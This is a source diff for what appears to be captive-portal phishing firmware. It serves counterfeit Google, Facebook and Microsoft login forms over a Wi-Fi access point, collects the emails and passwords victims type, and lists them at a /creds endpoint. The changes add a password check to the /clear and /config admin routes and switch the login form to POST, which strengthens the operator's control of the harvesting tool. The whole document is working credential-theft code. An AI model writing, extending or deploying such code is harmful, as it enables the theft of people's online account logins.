@@ -271,14 +271,24 @@ void setupWebServer() {
 #endif
   });
 
+  // Admin
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "application/json", creds_GET());
   });
 
   webServer.on("/clear", []() {
-    webServer.send(HTTP_CODE, "text/html", clear_GET());
+    webServer.send(HTTP_CODE, "application/json", clear_GET());
   });
 
+  webServer.on("/config", []() {
+    webServer.send(HTTP_CODE, "text/html", config_GET());
+  });
+
+  webServer.on("/post_config", []() {
+    webServer.send(HTTP_CODE, "text/html", config_POST());
+  });
+
+  // General
   webServer.on("/google", []() {
     webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
   });
@@ -289,14 +299,6 @@ void setupWebServer() {
 
   webServer.on("/facebook", []() {
     webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
-  });
-
-  webServer.on("/config", []() {
-    webServer.send(HTTP_CODE, "text/html", config_GET());
-  });
-
-  webServer.on("/post_config", []() {
-    webServer.send(HTTP_CODE, "text/html", config_POST());
   });
 
   webServer.onNotFound([]() {
@@ -629,7 +631,7 @@ String provider_GET(String provider) {
   loginMessage.replace(String("{provider}"), provider);
   loginButton.replace(String("{provider}"), provider);
 
-  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input type='hidden' name='provider' value='" + provider + "' /><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>", provider);
+  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' method='POST' id='login-form'><input type='hidden' name='provider' value='" + provider + "' /><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>", provider);
 }
 
 String index_POST() {
@@ -780,6 +782,10 @@ String getHtmlContents(String body, String provider) {
 
 
 String clear_GET() {
+  String secret = getInputValue("secret");
+  if (secret.isEmpty() || secret != SECRET)
+    return "{\"message\": \"access denied\"}";
+  
   capturedCredentialsJson = "";
   totalCapturedCredentials = cp1 = cp2 = cp3 = 0;
 
@@ -790,7 +796,7 @@ String clear_GET() {
     last_auth_pass[i] = "";
   }
 
-  return getAdminHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
+  return "{\"message\": \"The credentials list has been reset.\"}";
 }
 
 String creds_GET() {
@@ -801,13 +807,15 @@ String creds_GET() {
   return "{\"creds\": ["+ capturedCredentialsJson +"]}";
 }
 
-
 String config_GET() {
-  
-  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
+  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' method='POST' id='login-form'><input name='secret' class='input-field' type='password' placeholder='Admin Password' required><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
 }
 
 String config_POST() {
+  String secret = getInputValue("secret");
+  if (secret.isEmpty() || secret != SECRET)
+    return getAdminHtmlContents("<center><div class='containermsg'>Access denied!</div></center>");
+
   String ssid = getInputValue("ssid");
   String msft = getInputValue("msft");
   String google = getInputValue("google");
